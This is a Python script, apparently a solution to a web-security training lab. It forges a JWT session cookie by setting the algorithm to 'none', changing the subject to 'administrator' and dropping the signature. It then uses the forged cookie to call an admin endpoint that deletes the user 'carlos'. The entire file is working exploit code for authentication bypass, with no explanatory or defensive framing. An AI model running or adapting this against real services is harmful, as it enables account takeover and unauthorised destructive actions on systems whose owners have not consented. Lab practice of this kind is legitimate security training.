import base64
import json
import sys
import requests
import re

def base64_url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

def base64_url_decode(data):
    padding = 4 - len(data) % 4
    return base64.urlsafe_b64decode(data + '=' * padding)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
delete_url = burp_url + '/admin/delete?username=carlos'

session = requests.Session()
response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)

cookie_name = "session"
cookie_to_edit = session.cookies.get(cookie_name)

header_b64, payload_b64, signature = cookie_to_edit.split('.')

header_json = base64_url_decode(header_b64).decode('utf-8')
header_data = json.loads(header_json)
header_data['alg'] = 'none'
header_json_new = json.dumps(header_data)
header_b64_new = base64_url_encode(header_json_new.encode('utf-8')).decode('utf-8')

payload_json = base64_url_decode(payload_b64).decode('utf-8')
payload_data = json.loads(payload_json)
payload_data['sub'] = 'administrator'
payload_json_new = json.dumps(payload_data)
payload_b64_new = base64_url_encode(payload_json_new.encode('utf-8')).decode('utf-8')
new_cookie = f"{header_b64_new}.{payload_b64_new}."

burp_cookie = {"session": new_cookie}
session.get(delete_url, cookies=burp_cookie)
